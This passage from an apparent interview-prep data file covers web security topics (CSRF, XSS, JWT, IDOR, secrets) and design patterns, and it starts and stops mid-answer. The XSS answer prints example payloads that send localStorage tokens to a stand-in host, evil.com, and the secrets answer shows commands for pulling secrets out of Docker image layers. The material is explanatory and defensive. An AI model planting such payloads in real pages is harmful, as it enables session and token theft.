// 3. evil.com has: &lt;form action="bank.com/transfer" method="POST"&gt;
// 4. Browser automatically includes bank.com cookies → transfer happens!

// CSRF protection:
// - SameSite cookies (SameSite=Strict or Lax)
// - CSRF tokens (random token in form, verified server-side)
// - Check Origin/Referer headers</pre>
<div class="key-point">CORS is a protection mechanism (allow/block). CSRF is an attack pattern (exploit). CORS alone does NOT prevent CSRF. You need SameSite cookies or CSRF tokens.</div>`,
      },
      {
        q: 'What is XSS and why does it matter for token-based auth?',
        difficulty: 'hard',
        a: `<p><strong>XSS (Cross-Site Scripting)</strong>: An attacker injects malicious JavaScript that runs in your page with full access to everything the page can access.</p>
<pre>// Three types:
1. Stored XSS: malicious script saved in DB, served to all users
   Comment: &lt;script&gt;fetch('evil.com?token='+localStorage.getItem('jwt'))&lt;/script&gt;

2. Reflected XSS: malicious script in URL parameter
   https://myapp.com/search?q=&lt;script&gt;alert('hacked')&lt;/script&gt;

3. DOM-based XSS: script manipulates DOM unsafely
   document.innerHTML = userInput;  // DANGEROUS!</pre>
<p><strong>Impact on auth:</strong></p>
<pre>// If token is in localStorage:
localStorage.getItem('accessToken')  // attacker reads it!
fetch('https://evil.com/steal?token=' + token)  // sends to attacker

// If token is in HttpOnly cookie:
document.cookie  // can't read HttpOnly cookies ✅
// BUT attacker can still make requests AS the user from the page</pre>
<p><strong>Prevention:</strong></p>
<ul>
<li><strong>Output encoding</strong>: escape user content before rendering in HTML</li>
<li><strong>CSP headers</strong>: <code>Content-Security-Policy: script-src 'self'</code></li>
<li><strong>Framework safe rendering</strong>: React auto-escapes by default, Angular sanitizes</li>
<li><strong>Never use</strong>: <code>innerHTML</code>, <code>dangerouslySetInnerHTML</code>, <code>eval()</code> with user input</li>
</ul>
<div class="key-point">Even with HttpOnly cookies, XSS can act AS the user (make API calls, change data). XSS prevention is critical regardless of token storage strategy.</div>`,
      },
      {
        q: 'What is mTLS and when would you use it between services?',
        difficulty: 'hard',
        a: `<p><strong>mTLS (Mutual TLS)</strong> means both client and server verify each other's identity using certificates — not just the server (regular TLS).</p>
<pre>Regular TLS (HTTPS):
  Client → verifies server certificate → encrypted connection
  Server doesn't verify client identity

mTLS:
  Client → verifies server certificate ✅
  Server → verifies client certificate ✅
  Both sides know who they're talking to</pre>
<p><strong>How it works:</strong></p>
<ol>
<li>Each service has its own certificate signed by a trusted CA</li>
<li>On connection: server presents cert → client verifies</li>
<li>Client presents cert → server verifies</li>
<li>Both verified → encrypted communication established</li>
</ol>
<p><strong>When to use:</strong></p>
<ul>
<li>Service-to-service communication in microservices (zero-trust network)</li>
<li>API access for trusted partners (banking, healthcare)</li>
<li>IoT device authentication</li>
</ul>
<pre>// Common setup: service mesh handles mTLS automatically
// Istio/Linkerd inject sidecar proxies that handle certificates
// No code changes needed in your services</pre>
<div class="key-point">JWT proves user context (who is the user). mTLS proves service identity (which service is calling). They solve different problems and are often used together: mTLS between services + JWT for user context.</div>`,
      },
      {
        q: 'What is the difference between symmetric and asymmetric JWT signing?',
        difficulty: 'hard',
        a: `<table style="width:100%;border-collapse:collapse;margin:10px 0;font-size:.88rem;">
<tr><th style="text-align:left;padding:6px;border-bottom:1px solid #ccc;">Aspect</th><th style="padding:6px;border-bottom:1px solid #ccc;">Symmetric (HS256)</th><th style="padding:6px;border-bottom:1px solid #ccc;">Asymmetric (RS256)</th></tr>
<tr><td style="padding:6px;">Keys</td><td style="padding:6px;">One shared secret</td><td style="padding:6px;">Private key + Public key</td></tr>
<tr><td style="padding:6px;">Sign</td><td style="padding:6px;">Same secret</td><td style="padding:6px;">Private key (auth server only)</td></tr>
<tr><td style="padding:6px;">Verify</td><td style="padding:6px;">Same secret</td><td style="padding:6px;">Public key (anyone can verify)</td></tr>
<tr><td style="padding:6px;">Secret distribution</td><td style="padding:6px;">Must share secret with all verifiers</td><td style="padding:6px;">Only public key shared (safe)</td></tr>
</table>
<pre>// Symmetric (HS256): one secret for both signing and verifying
HMACSHA256(payload, "my-shared-secret")
// Every service that verifies tokens needs the secret → security risk

// Asymmetric (RS256): separate keys
Sign with PRIVATE key (only auth server has this)
Verify with PUBLIC key (published at /.well-known/jwks.json)
// Any service can verify without knowing the signing key!

// JWKS endpoint:
GET https://auth.myapp.com/.well-known/jwks.json
→ { "keys": [{ "kty": "RSA", "n": "...", "e": "AQAB" }] }</pre>
<div class="key-point">Use asymmetric (RS256/ES256) when many services need to verify tokens but only one authority should sign. This is the standard approach for microservices and third-party auth providers.</div>`,
      },
      {
        q: 'How do you protect login endpoints from brute-force attacks?',
        difficulty: 'medium',
        a: `<p>Login endpoints are prime targets for brute-force and credential stuffing attacks.</p>
<p><strong>Defense layers:</strong></p>
<ul>
<li><strong>Rate limiting</strong>: Max 5 attempts per account per 15 minutes</li>
<li><strong>Progressive delays</strong>: Increase response time after each failure (1s, 2s, 4s...)</li>
<li><strong>Account lockout with auto-unlock</strong>: Lock for 15 min after 10 failures (not permanent — that's a DoS vector)</li>
<li><strong>CAPTCHA</strong>: After 3 failures, require CAPTCHA</li>
<li><strong>MFA</strong>: Even if password is compromised, attacker needs second factor</li>
<li><strong>Password hashing</strong>: bcrypt/argon2 with high cost factor (makes each attempt slow)</li>
<li><strong>Monitor & alert</strong>: Detect credential stuffing patterns (many accounts, few attempts each)</li>
</ul>
<pre>// Rate limiting with Redis:
String key = "login:" + username + ":" + ip;
int attempts = redis.incr(key);
redis.expire(key, 900); // 15 min window

if (attempts > 5) {
    return Response.status(429)
        .header("Retry-After", "900")
        .body("Too many attempts. Try again in 15 minutes.");
}

// Password hashing (bcrypt):
String hash = BCrypt.hashpw(password, BCrypt.gensalt(12));
// 12 rounds → ~250ms per hash → brute force is impractical</pre>
<div class="key-point">Do not rely on account lockout alone — attackers can lock out legitimate users (denial of service). Combine rate limiting + progressive delays + MFA for robust protection.</div>`,
      },
      {
        q: 'How does refresh token rotation with reuse detection work?',
        difficulty: 'tricky',
        a: `<p><strong>Refresh token rotation</strong> means every refresh token is <strong>one-time use</strong>: each time the client refreshes, the server issues a NEW refresh token and invalidates the old one. The senior-level part is <strong>reuse detection</strong> — what happens when an already-used token shows up again.</p>
<pre>// Normal flow (rotation):
Client                        Server
  |-- POST /refresh (RT1) -->  |  RT1 valid → mark RT1 used
  |&lt;-- AT2 + RT2 ------------  |  issue new pair, same "family" F
  |-- POST /refresh (RT2) -->  |  RT2 valid → mark RT2 used
  |&lt;-- AT3 + RT3 ------------  |

// Theft scenario (reuse detection):
Attacker steals RT2 and uses it first:
  Attacker -- /refresh (RT2) --> server → OK, issues RT3' to attacker
  Victim   -- /refresh (RT2) --> server → RT2 ALREADY USED!
  → This is impossible in normal operation
  → Someone has a stolen copy → REVOKE THE ENTIRE FAMILY F
  → Both attacker's RT3' and victim's tokens are dead
  → Victim re-authenticates; attacker is locked out</pre>
<pre>// Server-side model:
refresh_tokens table:
  id | family_id | user_id | status (active|used|revoked) | expires_at

async function refresh(token) {
  const row = await db.findRefreshToken(hash(token));
  if (!row) throw new AuthError(401);

  if (row.status !== 'active') {
    // Reuse detected → nuke the whole family
    await db.revokeFamily(row.family_id);
    alertSecurityTeam(row.user_id);
    throw new AuthError(401);
  }
  await db.markUsed(row.id);
  return issueNewPair(row.user_id, row.family_id); // same family
}</pre>
<p><strong>Why revoke the whole family?</strong> After reuse you cannot tell which party (victim or attacker) holds the "current" token — the attacker may have refreshed first and now owns the newest one. Killing the family is the only safe move.</p>
<p><strong>Interviewer follow-ups:</strong> race conditions (a legitimate client retrying a timed-out refresh looks like reuse — allow a small grace window or make refresh idempotent per token), storing only <strong>hashes</strong> of refresh tokens, and binding the family to device/IP fingerprints for alerting.</p>
<div class="key-point">Rotation limits the blast radius of a stolen refresh token; reuse detection turns the stolen token into a tripwire — one replay and the entire token family is revoked.</div>`,
      },
      {
        q: 'Why should you NOT use JWT for user sessions? When does JWT actually win?',
        difficulty: 'tricky',
        a: `<p>This contrarian question separates seniors from tutorial-followers. JWT is often the <strong>wrong</strong> tool for classic browser sessions:</p>
<ul>
<li><strong>You can't revoke it</strong>: logout, password change, "ban this user now" — the token stays valid until <code>exp</code>. Every fix (blacklist in Redis, token versioning) reintroduces the server-side state JWT was supposed to eliminate.</li>
<li><strong>Payload bloat</strong>: roles, permissions, profile data get stuffed in; the token is sent on EVERY request. A 4 KB JWT vs a 32-byte session ID on every call adds up.</li>
<li><strong>Stale claims</strong>: role changes don't take effect until the token expires — admin demoted at 10:00 is still admin until 10:15.</li>
<li><strong>Clock skew</strong>: <code>exp</code>/<code>nbf</code> checks across servers with drifting clocks cause mysterious intermittent 401s (mitigate with a small leeway).</li>
<li><strong>Logout is a lie</strong>: deleting the cookie client-side doesn't invalidate the token an attacker already copied.</li>
</ul>
<pre>// Stateful session — boring and correct for one web app:
// Cookie: sessionId=abc123 (HttpOnly, Secure, SameSite)
const session = await redis.get('sess:' + sessionId);
// Logout?    redis.del('sess:' + sessionId)  → dead INSTANTLY
// Ban user?  delete all their sessions       → done
// Lookup cost: ~0.2ms Redis GET — almost never your bottleneck

// JWT "logout" in comparison:
// option A: wait for exp (user is "logged out" but token works)
// option B: Redis blacklist checked on every request
//           → congratulations, you rebuilt session storage</pre>
<p><strong>When JWT genuinely wins:</strong></p>
<ul>
<li><strong>Cross-service auth</strong>: service B verifies a token issued by auth server A with just the public key — no shared session store, no network hop.</li>
<li><strong>Short-lived access tokens</strong> (5–15 min) paired with revocable server-side refresh tokens — the standard OAuth2 pattern.</li>
<li><strong>Stateless one-shot grants</strong>: signed download links, email verification, password reset tokens.</li>
</ul>
<div class="key-point">For a single web app, a session ID in an HttpOnly cookie + Redis is simpler and instantly revocable. JWT earns its complexity only for short-lived, cross-service credentials — "stateless" just means the state problem moved, not disappeared.</div>`,
      },
      {
        q: 'What is IDOR (Insecure Direct Object Reference) and how do you prevent it?',
        difficulty: 'hard',
        a: `<p><strong>IDOR</strong> is when an application exposes a direct reference to an internal object (an ID) and fails to check that the <em>authenticated</em> user is <em>authorized</em> for that specific object. It has topped the OWASP list (as Broken Access Control) for years because it's trivially easy to introduce.</p>
<pre>// The attack — no tools needed, just curiosity:
GET /api/orders/123   → my order. Logged in, token valid. 200 OK
GET /api/orders/124   → someone ELSE's order... also 200 OK!

// The vulnerable code — authentication ≠ authorization:
app.get('/api/orders/:id', requireAuth, async (req, res) => {
  const order = await db.query(
    'SELECT * FROM orders WHERE id = ?', [req.params.id]
  ); // ← checked WHO you are, never WHAT you may see
  res.json(order);
});</pre>
<pre>// The fix: ownership is part of EVERY query, not an afterthought
app.get('/api/orders/:id', requireAuth, async (req, res) => {
  const order = await db.query(
    'SELECT * FROM orders WHERE id = ? AND user_id = ?',
    [req.params.id, req.user.id]   // ← scope to current user
  );
  if (!order) return res.sendStatus(404); // don't leak existence
  res.json(order);
});

// Even better: make it impossible to forget
class OrderRepository {
  findForUser(orderId, userId) {   // no "find(orderId)" exists
    return db.query('... WHERE id = ? AND user_id = ?',
                    [orderId, userId]);
  }
}</pre>
<p><strong>Why "hide the button in the UI" fails:</strong> the UI is not a security boundary — attackers use curl, not your React app. The check must live in the data-access path on the server.</p>
<p><strong>Defense in depth:</strong></p>
<ul>
<li>Scope every query/repository method by owner or tenant — centralize it so a developer can't forget.</li>
<li>Return <code>404</code> (not <code>403</code>) for objects the user can't see, so IDs can't be enumerated.</li>
<li>Use UUIDs instead of sequential IDs — but only as an obscurity layer, <strong>never</strong> as the fix.</li>
<li>Write authorization tests: "user A requests user B's resource → 404".</li>
</ul>
<div class="key-point">Authentication answers "who are you?"; authorization answers "may YOU touch THIS object?" — IDOR happens whenever the second check is missing, and the only real fix is an ownership predicate in every data access.</div>`,
      },
      {
        q: 'How do you store and manage application secrets properly?',
        difficulty: 'hard',
        a: `<p>Secrets (DB passwords, API keys, signing keys) leak through predictable paths, and each naive storage level fails differently:</p>
<ul>
<li><strong>Hardcoded in source</strong>: lives forever in git history — rotating the secret doesn't scrub old commits; one leaked repo leaks everything.</li>
<li><strong>.env files</strong>: fine locally, but they get committed by accident, copied to laptops, and pasted into Slack. No audit trail, no rotation.</li>
<li><strong>Plain env vars in production</strong>: visible via <code>docker inspect</code>, <code>/proc/&lt;pid&gt;/environ</code>, crash dumps, and often echoed into logs by debug tooling.</li>
</ul>
<pre># The Docker image layer trap — a classic senior gotcha:
FROM node:20
COPY .env .          # layer 3 now contains the secret
RUN rm .env          # layer 4 "deletes" it...
# ...but layers are immutable! Anyone with the image runs:
#   docker save app | tar -x && cat */layer.tar
# and reads the secret from layer 3. Same trap:
ARG DB_PASSWORD      # build args are baked into image history
# → docker history --no-trunc shows it</pre>
<pre>// The right pattern: fetch at runtime from a secret manager
// (Vault, AWS Secrets Manager, GCP Secret Manager, Azure Key Vault)
import { SecretsManagerClient, GetSecretValueCommand }
  from '@aws-sdk/client-secrets-manager';

const client = new SecretsManagerClient({});
// No secret in code, image, or env — the pod's IAM role/service
// account is the identity; the manager checks it and audits access.
const res = await client.send(new GetSecretValueCommand({
  SecretId: 'prod/payment-service/db',
}));
const { password } = JSON.parse(res.SecretString);</pre>
<p><strong>What a real secrets setup gives you:</strong></p>
<ul>
<li><strong>Rotation</strong>: secrets change on a schedule (or on incident) without redeploys; apps re-fetch or receive new leases. Design for rotation from day one — retrofit is painful.</li>
<li><strong>Least privilege</strong>: each service can read only its own secrets; a compromised pod doesn't leak the whole vault.</li>
<li><strong>Audit log</strong>: who read which secret when — essential for incident response.</li>
<li><strong>Dynamic secrets</strong> (Vault): short-lived, per-instance DB credentials that expire on their own — the strongest option.</li>
</ul>
<p><strong>Interviewer follow-ups:</strong> how does the app authenticate to the secret manager without... a secret? (Answer: platform identity — IAM roles, Kubernetes service accounts, instance metadata.) And: add pre-commit scanning (gitleaks, trufflehog) because someone WILL commit a key eventually.</p>
<div class="key-point">Secrets should exist only in a dedicated manager with identity-based access, rotation, and audit — never in code, git history, Docker layers, or long-lived env files; assume anything that touched git or an image layer is already leaked.</div>`,
      },
    ],
  },

  // ========================= DESIGN PATTERNS =========================,
  {
    id: 'design-patterns',
    name: 'Design Patterns',
    icon: '🧩',
    questions: [
      {
        q: 'What is a design pattern and why does it matter?',
        difficulty: 'easy',
        a: `<p>A <strong>design pattern</strong> is a reusable solution to a recurring design problem.</p>
<ul>
<li>It gives a shared vocabulary.</li>
<li>It improves maintainability when used appropriately.</li>
<li>It is not a rule to force everywhere.</li>
</ul>
<pre>// Example: same interface, different implementations
interface NotificationSender {
    void send(String message);
}

class EmailSender implements NotificationSender {
    public void send(String message) {
        System.out.println("Email: " + message);
    }
}

class SmsSender implements NotificationSender {
    public void send(String message) {
        System.out.println("SMS: " + message);
    }
}</pre>
<div class="key-point">Patterns are tools, not goals. Overusing them can make simple code harder to understand.</div>`,
      },
      {
        q: 'What is the Singleton pattern and what are its risks?',
        difficulty: 'medium',
        a: `<p><strong>Singleton</strong> ensures only one instance of a class exists.</p>
<ul>
<li>Useful for shared configuration or one-off coordinators.</li>
<li>Risks: hidden global state, hard testing, tight coupling.</li>
</ul>
<pre>// Enum-based Singleton in Java
public enum AppConfig {
    INSTANCE;

    private final String env = "prod";

    public String getEnv() {
        return env;
    }
}

// Usage:
String env = AppConfig.INSTANCE.getEnv();</pre>
<div class="key-point">In Java, enum-based singleton is the safest common implementation.</div>`,
      },
      {
        q: 'What is the Factory Method pattern?',
        difficulty: 'medium',
        a: `<p><strong>Factory Method</strong> delegates object creation to a method instead of calling constructors directly everywhere.</p>
<pre>interface PaymentGateway {
    void pay(int amount);
}

class StripeGateway implements PaymentGateway {
    public void pay(int amount) {
        System.out.println("Paid by Stripe: " + amount);
    }
}

class PaypalGateway implements PaymentGateway {
    public void pay(int amount) {
        System.out.println("Paid by PayPal: " + amount);
    }
}

class PaymentGatewayFactory {
    public PaymentGateway create(String type) {
        if ("stripe".equalsIgnoreCase(type)) return new StripeGateway();
        if ("paypal".equalsIgnoreCase(type)) return new PaypalGateway();
        throw new IllegalArgumentException("Unknown type");
    }
}</pre>
<div class="key-point">Use it when creation logic varies and you want calling code to depend on abstractions.</div>`,
      },
      {
        q: 'What is the difference between Factory Method and Abstract Factory?',
        difficulty: 'medium',
        a: `<ul>
<li><strong>Factory Method</strong>: creates one product type.</li>
<li><strong>Abstract Factory</strong>: creates a family of related products.</li>
</ul>
<pre>interface Button {
    void render();
}

interface Dialog {
    void open();
}

class LightButton implements Button {
    public void render() { System.out.println("Light Button"); }
}

class LightDialog implements Dialog {
    public void open() { System.out.println("Light Dialog"); }
}

interface UiFactory {
    Button createButton();
    Dialog createDialog();
}

class LightUiFactory implements UiFactory {
    public Button createButton() { return new LightButton(); }
    public Dialog createDialog() { return new LightDialog(); }
}</pre>
<div class="key-point">Abstract Factory is useful when several objects must match, such as a theme-specific button, dialog, and input.</div>`,
      },
      {
        q: 'What is the Builder pattern and why is it useful?',
        difficulty: 'easy',
        a: `<p><strong>Builder</strong> constructs complex objects step by step.</p>
<ul>
<li>Improves readability.</li>
<li>Avoids long constructors with many optional arguments.</li>
<li>Works well for immutable objects.</li>
</ul>
<pre>class User {
    private final String name;
    private final String email;
    private final String role;

    private User(Builder builder) {
        this.name = builder.name;
        this.email = builder.email;
        this.role = builder.role;
    }

    public static class Builder {
        private String name;
        private String email;
        private String role = "USER";

        public Builder name(String name) { this.name = name; return this; }
        public Builder email(String email) { this.email = email; return this; }
        public Builder role(String role) { this.role = role; return this; }
        public User build() { return new User(this); }
    }
}

User user = new User.Builder()
    .name("Alice")
    .email("alice@mail.com")
    .role("ADMIN")
    .build();</pre>
<div class="key-point">Builder is ideal when parameter count grows and constructor calls become hard to read safely.</div>`,
      },
      {
        q: 'What is the Strategy pattern and when do you use it?',
        difficulty: 'easy',
        a: `<p><strong>Strategy</strong> encapsulates interchangeable algorithms behind a common interface.</p>
<pre>interface DiscountStrategy {
    double apply(double price);
}

class MemberDiscount implements DiscountStrategy {
    public double apply(double price) { return price * 0.9; }
}

class HolidayDiscount implements DiscountStrategy {
    public double apply(double price) { return price * 0.8; }
}

class CheckoutService {
    private final DiscountStrategy strategy;

    CheckoutService(DiscountStrategy strategy) {
        this.strategy = strategy;
    }

    double total(double price) {
        return strategy.apply(price);
    }
}</pre>
<div class="key-point">Strategy is great for removing large if/else blocks around changing business rules.</div>`,
      },
      {
        q: 'What is the difference between Strategy and State?',
        difficulty: 'hard',
        a: `<ul>
<li><strong>Strategy</strong>: choose one behavior among alternatives.</li>
<li><strong>State</strong>: behavior changes based on current lifecycle state.</li>
</ul>
<pre>// Strategy: chosen from outside
CheckoutService checkout = new CheckoutService(new MemberDiscount());

// State: behavior changes inside the object
interface OrderState {
    void next(Order order);
}

class CreatedState implements OrderState {
    public void next(Order order) {
        order.setState(new PaidState());
    }
}

class PaidState implements OrderState {
    public void next(Order order) {
        System.out.println("Ship order");
    }
}

class Order {
    private OrderState state = new CreatedState();
    void setState(OrderState state) { this.state = state; }
    void next() { state.next(this); }
}</pre>
<div class="key-point">If behavior depends on object lifecycle transitions, it is usually State, not Strategy.</div>`,
      },
      {
        q: 'What is the Observer pattern?',
        difficulty: 'easy',
        a: `<p><strong>Observer</strong> defines a one-to-many dependency so observers are notified when subject state changes.</p>
<pre>interface Observer {
    void update(String event);
}

class EmailObserver implements Observer {
    public void update(String event) {
        System.out.println("Email received: " + event);
    }
}

class OrderSubject {
    private final java.util.List&lt;Observer&gt; observers = new java.util.ArrayList&lt;&gt;();

    void addObserver(Observer observer) {
        observers.add(observer);
    }

    void notifyObservers(String event) {
        for (Observer observer : observers) {
            observer.update(event);
        }
    }
}</pre>
<div class="key-point">Observer is common in UI events and in-process event systems.</div>`,
      },
      {
        q: 'What is the difference between Observer and Pub/Sub?',
        difficulty: 'medium',
        a: `<ul>
<li><strong>Observer</strong>: in-process object pattern.</li>
<li><strong>Pub/Sub</strong>: distributed messaging architecture using a broker.</li>
</ul>
<pre>// Observer: direct in-memory subscription
OrderSubject subject = new OrderSubject();
subject.addObserver(new EmailObserver());
subject.notifyObservers("Order shipped");

// Pub/Sub: publisher talks to broker, not direct subscribers
class EventBus {
    void publish(String topic, String event) {
        System.out.println("Published to " + topic + ": " + event);
    }
}

new EventBus().publish("orders", "OrderShipped");</pre>
<div class="key-point">They are similar in idea but very different in runtime, scalability, and failure behavior.</div>`,
      },
      {
        q: 'What is the Adapter pattern?',
        difficulty: 'medium',
        a: `<p><strong>Adapter</strong> converts one interface into another interface expected by the client.</p>
<pre>class LegacyPaymentApi {
    void makePayment(int cents) {
        System.out.println("Legacy paid: " + cents);
    }
}

interface PaymentProcessor {
    void pay(int amount);
}

class PaymentAdapter implements PaymentProcessor {
    private final LegacyPaymentApi legacy = new LegacyPaymentApi();

    public void pay(int amount) {
        legacy.makePayment(amount * 100);
    }
}</pre>
<div class="key-point">Use Adapter when integrating old or third-party APIs without changing the rest of your code.</div>`,
      },
      {
        q: 'What is the Facade pattern?',
        difficulty: 'medium',
        a: `<p><strong>Facade</strong> provides a simplified interface over a complex subsystem.</p>
<pre>class InventoryService {
    void reserve(String item) { System.out.println("Reserved " + item); }
}

class PaymentService {
    void charge(int amount) { System.out.println("Charged " + amount); }
}

class EmailService {
    void sendReceipt() { System.out.println("Receipt sent"); }
}

class CheckoutFacade {
    private final InventoryService inventory = new InventoryService();
    private final PaymentService payment = new PaymentService();
    private final EmailService email = new EmailService();

    void checkout(String item, int amount) {
        inventory.reserve(item);
        payment.charge(amount);
        email.sendReceipt();
    }
}</pre>
<div class="key-point">Facade reduces client complexity and centralizes orchestration.</div>`,
      },
      {
        q: 'What is the Proxy pattern?',
        difficulty: 'medium',
        a: `<p><strong>Proxy</strong> keeps the same interface as the real object but controls access to it.</p>
<ul>
<li>Lazy loading</li>
<li>Security checks</li>
<li>Remote calls</li>
<li>Logging or transaction interception</li>
</ul>
<pre>interface Image {
    void display();
}

class RealImage implements Image {
    private final String fileName;

    RealImage(String fileName) {
        this.fileName = fileName;
        System.out.println("Loading " + fileName);
    }

    public void display() {
        System.out.println("Displaying " + fileName);
    }
}

class ImageProxy implements Image {
    private RealImage realImage;
    private final String fileName;

    ImageProxy(String fileName) {
        this.fileName = fileName;
    }

    public void display() {
        if (realImage == null) realImage = new RealImage(fileName);
        realImage.display();
    }
}</pre>
<div class="key-point">Spring AOP and many ORM lazy-loading features are classic proxy examples.</div>`,
      },
      {
        q: 'What is the Decorator pattern?',
        difficulty: 'medium',
        a: `<p><strong>Decorator</strong> adds behavior to an object without changing its class.</p>
<pre>interface Coffee {
    String description();
    int cost();
}

class BasicCoffee implements Coffee {
    public String description() { return "Coffee"; }
    public int cost() { return 50; }
}

class MilkDecorator implements Coffee {
    private final Coffee coffee;

    MilkDecorator(Coffee coffee) {
        this.coffee = coffee;
    }

    public String description() { return coffee.description() + ", Milk"; }
    public int cost() { return coffee.cost() + 10; }
}</pre>
<div class="key-point">Decorator is useful when behavior must be combined flexibly at runtime.</div>`,
      },
      {
        q: 'What is the Template Method pattern?',
        difficulty: 'medium',
        a: `<p><strong>Template Method</strong> defines the skeleton of an algorithm in a base class while subclasses customize steps.</p>
<pre>abstract class FileProcessor {
    public final void process() {
        read();
        transform();
        save();
    }

    abstract void read();
    abstract void transform();

    void save() {
        System.out.println("Saved file");
    }
}

class CsvProcessor extends FileProcessor {
    void read() { System.out.println("Read CSV"); }
    void transform() { System.out.println("Transform CSV"); }
}</pre>
<div class="key-point">Use Template Method when the algorithm flow stays stable but some steps vary.</div>`,
      },
      {
        q: 'What is the Chain of Responsibility pattern?',
        difficulty: 'hard',
        a: `<p><strong>Chain of Responsibility</strong> passes a request through a chain of handlers until one handles it or the chain ends.</p>
<pre>abstract class Handler {
    private Handler next;

    public Handler linkWith(Handler next) {
        this.next = next;
        return next;
    }

    public void handle(String request) {
        process(request);
        if (next != null) next.handle(request);
    }

    protected abstract void process(String request);
}

class AuthHandler extends Handler {
    protected void process(String request) {
        System.out.println("Auth check: " + request);
    }
}

class AuditHandler extends Handler {
    protected void process(String request) {
        System.out.println("Audit log: " + request);
    }
}</pre>
<div class="key-point">HTTP middleware and servlet filters are common real-world examples.</div>`,
      },
      {
        q: 'What is the Repository pattern?',
        difficulty: 'medium',
        a: `<p><strong>Repository</strong> abstracts data access behind a collection-like interface, decoupling business logic from persistence details.</p>
<pre>// Without Repository: business logic knows about JPA
entityManager.createQuery("SELECT u FROM User u WHERE u.email = :email")
    .setParameter("email", email)
    .getSingleResult();

// With Repository: clean abstraction
interface UserRepository {
    Optional&lt;User&gt; findByEmail(String email);
    List&lt;User&gt; findByRole(String role);
    void save(User user);
    void delete(User user);
}

class JpaUserRepository implements UserRepository {
    private final EntityManager em;

    public Optional&lt;User&gt; findByEmail(String email) {
        return em.createQuery("SELECT u FROM User u WHERE u.email = :email", User.class)
            .setParameter("email", email)
            .getResultStream().findFirst();
    }
    // ...
}

// Business logic only depends on interface:
class UserService {
    private final UserRepository repo; // can swap JPA → MongoDB → in-memory

    User register(String email) {
        if (repo.findByEmail(email).isPresent()) throw new DuplicateEmailException();
        User user = new User(email);
        repo.save(user);
        return user;
    }
}</pre>
<div class="key-point">Repository makes business logic testable (inject a fake repo in tests) and allows swapping persistence technology without changing domain code. Spring Data JPA auto-generates repository implementations.</div>`,
      },
      {
        q: 'What is Dependency Injection and how does it relate to design patterns?',
        difficulty: 'medium',
        a: `<p><strong>Dependency Injection (DI)</strong> provides dependencies from outside rather than creating them inside, enabling loose coupling and testability.</p>
<pre>// ❌ Without DI: tight coupling
class OrderService {
    private EmailService emailService = new EmailService(); // hardcoded dependency
    private PaymentGateway gateway = new StripeGateway();   // can't swap easily
}

// ✅ With DI: dependencies injected
class OrderService {
    private final EmailService emailService;
    private final PaymentGateway gateway;

    // Constructor injection (preferred)
    OrderService(EmailService emailService, PaymentGateway gateway) {
        this.emailService = emailService;
        this.gateway = gateway;
    }
}

// Production: new OrderService(new SmtpEmailService(), new StripeGateway())
// Testing:    new OrderService(new MockEmailService(), new MockGateway())</pre>
<p><strong>DI types:</strong></p>
<ul>
<li><strong>Constructor injection</strong> (recommended): all dependencies in constructor, object is always valid</li>
<li><strong>Setter injection</strong>: optional dependencies, can change at runtime</li>
<li><strong>Field injection</strong>: Spring @Autowired on fields — convenient but harder to test</li>
</ul>
<div class="key-point">DI applies the Dependency Inversion Principle (the "D" in SOLID): depend on abstractions, not concrete classes. Spring, Angular, and .NET all have built-in DI containers.</div>`,
      },
      {
        q: 'What are SOLID principles? Give a brief example of each.',
        difficulty: 'hard',
        a: `<p>SOLID is five object-oriented design principles that make code more maintainable:</p>
<pre>S - Single Responsibility: One class = one reason to change
  ❌ UserService handles login, email sending, and PDF generation
  ✅ UserService handles login; EmailService handles email; PdfService handles PDF

O - Open/Closed: Open for extension, closed for modification
  ❌ if (type == "pdf") ... else if (type == "csv") ... // modify to add new type
  ✅ interface Exporter { void export(); } // extend by adding new class

L - Liskov Substitution: Subtype must work wherever parent type is expected
  ❌ class Square extends Rectangle { setWidth() { also sets height } }
     // violates: Rectangle user expects width/height to be independent
  ✅ Use separate Shape interface for Square and Rectangle

I - Interface Segregation: Don't force classes to implement methods they don't use
  ❌ interface Worker { void code(); void manageMeetings(); void cook(); }
  ✅ interface Coder { void code(); }
     interface Manager { void manageMeetings(); }

D - Dependency Inversion: Depend on abstractions, not concretions
  ❌ class OrderService { private MySqlRepo repo = new MySqlRepo(); }
  ✅ class OrderService { private Repository repo; // interface injected }</pre>
<div class="key-point">SOLID principles are heavily asked in interviews. Know one concrete example for each. The most commonly tested are Single Responsibility (S) and Dependency Inversion (D).</div>`,
      },
      {
        q: 'What is the difference between Adapter, Facade, and Proxy patterns?',
        difficulty: 'tricky',
        a: `<p>All three wrap another object, but for <strong>different reasons</strong>:</p>
<table><tr><th>Pattern</th><th>Purpose</th><th>Interface</th><th>Example</th></tr>
<tr><td><strong>Adapter</strong></td><td>Convert incompatible interface</td><td>Changes interface</td><td>Legacy API → new interface</td></tr>
<tr><td><strong>Facade</strong></td><td>Simplify complex subsystem</td><td>New simplified interface</td><td>checkout() wraps 5 services</td></tr>
<tr><td><strong>Proxy</strong></td><td>Control access to real object</td><td>Same interface as real</td><td>Lazy load, security check, caching</td></tr></table>
<pre>// Adapter: makes incompatible interface compatible
class OldPaymentAdapter implements NewPaymentInterface {
    private OldPaymentSystem old;
    void pay(Money m) { old.makePayment(m.toCents()); } // adapts interface
}

// Facade: simplifies multiple subsystems
class OrderFacade {
    void placeOrder() {
        inventoryService.reserve();  // hides complexity
        paymentService.charge();     // of multiple services
        emailService.notify();       // behind one method
    }
}

// Proxy: same interface, adds behavior
class CachingUserProxy implements UserService {
    private UserService real;
    User getUser(int id) {
        if (cache.has(id)) return cache.get(id);  // adds caching
        return real.getUser(id);                    // same interface
    }
}</pre>
<div class="key-point">Trick question tip: If asked "which pattern wraps another object?" — all three do! The difference is WHY: Adapter = interface mismatch, Facade = simplification, Proxy = access control.</div>`,
      },
      {
        q: 'Why is double-checked locking broken without volatile?',
        difficulty: 'tricky',
        a: `<p>The classic Java singleton trap. Double-checked locking tries to avoid synchronizing on every <code>getInstance()</code> call — but without <code>volatile</code> it can return a <strong>half-constructed object</strong>.</p>
<pre>// BROKEN without volatile:
class Singleton {
    private static Singleton instance;   // ← missing volatile!

    static Singleton getInstance() {
        if (instance == null) {                  // 1st check (no lock)
            synchronized (Singleton.class) {
                if (instance == null) {          // 2nd check (locked)
                    instance = new Singleton();  // ← the problem
                }
            }
        }
        return instance;
    }
}

// "instance = new Singleton()" is NOT atomic. It's roughly:
//   1. allocate memory
//   2. run constructor (initialize fields)
//   3. assign reference to 'instance'
// The JIT/CPU may REORDER 2 and 3. So Thread A can publish
// the reference (step 3) BEFORE the constructor ran (step 2).
// Thread B sees instance != null at the 1st check (no lock,
